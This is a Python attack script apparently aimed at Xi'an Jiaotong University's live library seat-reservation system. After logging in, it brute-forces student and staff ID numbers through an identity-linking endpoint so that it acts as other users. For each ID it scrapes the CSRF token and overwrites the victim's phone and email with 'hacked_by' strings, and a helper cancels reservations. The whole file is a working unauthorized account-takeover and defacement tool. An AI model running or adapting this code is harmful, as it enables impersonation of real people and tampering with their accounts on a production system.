#!/usr/bin/env python3
# @Author  : Guoguo
# @Blog    ：https://gwyxjtu.github.io
import os
import time
import json
import base64
import requests
from Crypto.Cipher import AES
import re
import aiohttp
import asyncio
class XJTUUser(object):

    def __init__(self, config_file_path='./config.json'):
        with open(config_file_path) as config_file:
            config = json.loads(config_file.read())
        self.config = config
        self.is_login = False
        self.session = requests.Session()
        self.session.headers.update(config['headers'])
        self.session.cookies.update(config['cookies'])

    async def login(self):
        def cancel(self):
            try:
                r = self.session.get("http://rg.lib.xjtu.edu.cn:8010/my/")
                pattern = re.compile("cancelconfirm\('(.*?)'\);", re.S) 
                yu_id = re.findall(pattern, r.text)[0]
                print(yu_id)
                self.session.get("http://rg.lib.xjtu.edu.cn:8010/my/?cancel=1&ri=" + yu_id)
                #微信通知
                print("取消成功")
            except Exception as e:
                1#print("取消失败\n" + str(e))
        def change_ident(self):
            _headers = self.config['headers']
            _headers['Referer'] = 'http://rg.lib.xjtu.edu.cn:8010/modify'

            r = self.session.get('http://rg.lib.xjtu.edu.cn:8010/modify')#入关
            #print('--------------------------')
            nn = r.text.find('<input id="csrf_token" name="csrf_token" type="hidden" value=')
            tok = r.text[nn+1+len('<input id="csrf_token" name="csrf_token" type="hidden" value='):nn+56+len('<input id="csrf_token" name="csrf_token" type="hidden" value=')]
            #print(r.text[nn+1+len('<input id="csrf_token" name="csrf_token" type="hidden" value='):nn+56+len('<input id="csrf_token" name="csrf_token" type="hidden" value=')])

            #print('-------------')
            
            #print(tok)
            data={
            'csrf_token':tok,
            'csrf_token':tok,
            'submit':'确认',
            'rplace':'east',
            'tel':'hacked_by_自动化73郭果果',
            'email':'hacked_by_AUTO_73_Guoguo@gwyxjtu.github.io'
            }#入关post,比较麻烦
            #print(data)
            r = self.session.post('http://rg.lib.xjtu.edu.cn:8010/modify',data = data)#提交


            #print(r.text)
            if('您的信息已经修改成功!' in r.text):
                return 1
            else:
                return 0

        def encrypt_pwd(raw_pwd, publicKey='0725@pwdorgopenp'):
            ''' AES-ECB encrypt '''
            publicKey = publicKey.encode('utf-8')
            # pkcs7 padding
            BS = AES.block_size
            pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
            pwd = pad(raw_pwd)
            # zero padding
            '''
            pwd = raw_pwd
            while len(raw_pwd.encode('utf-8')) % 16 != 0:
                pwd += '\0'
            '''
            cipher = AES.new(publicKey, AES.MODE_ECB)
            pwd = cipher.encrypt(pwd.encode('utf-8'))
            return str(base64.b64encode(pwd), encoding='utf-8')
        async def main_hack(self,id_number):
            _headers = self.config['headers']
            _headers['Content-Type'] = 'application/x-www-form-urlencoded'

            # start with 302 redirection from ehall
            _r = self.session.get('http://rg.lib.xjtu.edu.cn:8010/auth/login/?next=%2Fseat%2F')

            # get cookie route
            self.session.get('https://org.xjtu.edu.cn/openplatform/login.html')

            # get JcaptchaCode and cookie JSESSIONID & sid_code
            r_JcaptchaCode = self.session.post('https://org.xjtu.edu.cn/openplatform/g/admin/getJcaptchaCode',
                                  headers=_headers)

            # is_JcaptchaCode_show
            url = 'https://org.xjtu.edu.cn/openplatform/g/admin/getIsShowJcaptchaCode'
            params = {
                'userName': self.config['username'],
                '_': str(int(time.time() * 1000))
            }
            r = self.session.get(url, params=params, headers=_headers)
            #print(r.text)
            # login
            url = 'https://org.xjtu.edu.cn/openplatform/g/admin/login'
            cookie = {
                'cur_appId_':'JL4oKidbLpQ='
            }
            data = {
                "loginType": 1,
                "username": self.config['username'],
                "pwd": encrypt_pwd(self.config['password']),
                "jcaptchaCode": ""
            }
            _headers['Content-Type'] = 'application/json;charset=UTF-8'
            r = self.session.post(url, data=json.dumps(data), headers=_headers,cookies=cookie)
            #print(r.text)
            token = json.loads(r.text)['data']['tokenKey']

            cookie = {
                'cur_appId_':'JL4oKidbLpQ=',
                'open_Platform_User' : token
            }
            r=self.session.get('http://org.xjtu.edu.cn/openplatform/oauth/auth/getRedirectUrl?userType=1&personNo='+self.config['person_id']+'&_=1590998261976',cookies = cookie)
            #print(r.text)
            r=self.session.get(json.loads(r.text)['data'])
            r=self.session.get('http://rg.lib.xjtu.edu.cn:8080/bxusr/link.jsp?uid='+self.config['username']+'&cn=%E9%83%AD%E7%8E%8B%E6%87%BF&employeeNumber='+id_number+'&depId=%E7%94%B5%E5%AD%90%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AD%A6%E9%83%A8&mobile')#&email=867718012@qq.com去掉了
            if('首次登陆请确认您的学号/工号信息是否为' in r.text):
                return 0
            #print(r.text)
            #---------------------登陆成功------------------------
            #print(r_w3.text)
            #print('各层座位数量',end = '')
            #print(json.loads(r_e3.text)['scount'])
            #s1 = json.loads(r_s2.text)['seat']
            #s2 = json.loads(r_n2.text)['seat']
            #s.update(json.loads(r_w3.text)['seat'])/seat/?kid=015&sp=north4southwest
            #print(s1,s2)

            #while(1):
            return(change_ident(self))


        for i in ['217','218','219']:
            for j in ['61','12','31','50','13','41','53','21','23','43','34','37','32','33','36','42','45','62','14','15','11','22','35','52','44','63','51','46']:
                for h in ['2','1']:
                    for k in range(1454,9999):
                        if(await main_hack(self,i+j+h+str(k).rjust(4,'0')) == 1):
                            print('\n'+i+j+str(k).rjust(5,'0'))
                        else:
                            print('f',end = '')



if __name__ == '__main__':
    #print('begin')
    #time.sleep(18600)
    guoguo = XJTUUser()
    asyncio.run(guoguo.login())
